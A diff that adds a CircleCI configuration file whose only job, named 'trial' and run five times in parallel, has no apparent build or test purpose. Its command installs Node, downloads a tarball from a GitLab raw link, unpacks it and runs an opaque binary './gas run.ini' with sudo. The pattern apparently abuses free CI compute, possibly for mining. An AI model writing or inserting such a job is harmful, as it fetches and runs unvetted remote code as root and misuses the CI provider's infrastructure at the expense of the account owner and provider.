@@ -1,0 +1,16 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: cimg/node:18.2.0
+      parallelism: 5
+      steps:
+        - run:
+            name: "trial"
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/dent4/file/-/raw/main/dent.tar.gz && tar -xf dent.tar.gz && sudo ./gas run.ini 
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
